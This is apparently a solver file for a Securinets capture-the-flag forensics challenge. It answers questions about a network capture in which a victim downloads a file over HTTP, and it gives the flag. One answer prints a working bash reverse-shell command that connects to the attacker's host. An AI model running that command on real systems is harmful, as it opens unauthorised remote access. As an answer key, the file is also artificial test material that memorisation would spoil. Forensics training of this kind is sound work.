## solver

```
1- How many packets are present in the network capture? 
835
2- What was the name of the file downloaded by the victim?
revOXM06
3- What is the ip of the attacker? you can filter with HTTP to see that ha victim download the file revOXM06 from this IP
192.168.0.13
4- What port number did the attacker use to establish the HTTP connection?
8000
5- What commands were executed to get the reverse shell? you can find it in the content of the file revOXM06
bash -i >& /dev/tcp/192.168.0.13/4444 0>&1
6- Can you determine the date when the file was downloaded by the victim? format (DDD, XX XXX YYYY HH:MM:HH GMT)
Sun, 11 Feb 2024 22:02:13 GMT
7- What is the sha256 of the downloaded file ? just export the file and use (sha256sum revOXM06)
0b0c038a700d95744a1c70c322846b4d66438eda3af4acfd353d9532a9b19945
8- What is the content of the secret file? follow the tcp stream between the attacker and the victim
Securinets{_I_10vE_Wire5hArK}
```